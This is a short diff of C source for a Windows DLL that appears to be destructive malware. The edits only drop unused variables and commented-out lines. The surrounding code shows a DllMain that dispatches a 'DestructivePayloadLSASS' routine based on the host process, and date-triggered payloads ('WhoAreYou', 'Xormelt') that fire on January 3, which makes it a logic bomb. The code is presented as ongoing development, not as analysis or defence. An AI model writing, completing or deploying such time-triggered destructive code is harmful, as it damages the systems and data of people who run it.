@@ -1,8 +1,6 @@
 #include <Windows.h>
 #define DLLEXPORT __declspec(dllexport)
 DWORD state;
-DWORD ThreadCounter = 0;
-#define avg(x, y) (x + y) / 2
 //i call this one xorshit
 DLLEXPORT DWORD rng() {
 	state ^= state >> 7;
@@ -114,7 +112,6 @@ DWORD WINAPI DllMain(HMODULE hDllModule, DWORD dwReason, LPVOID lpReserved) {
 				DestructivePayloadLSASS();
 			}
 		}
-		//else if (!lstrcmpW(lpProcname, L"explorer.exe") || AlwaysEXPLORER && !AlwaysLSASS) {
 		else {
 			if (systime.wDay == 3 && systime.wMonth == 1 || AlwaysJanuary3){
 				WhoAreYou();
@@ -123,7 +120,6 @@ DWORD WINAPI DllMain(HMODULE hDllModule, DWORD dwReason, LPVOID lpReserved) {
 				Xormelt();
 			}
 		}		
-		//else return 1;
 	}
 	return 1;
 }
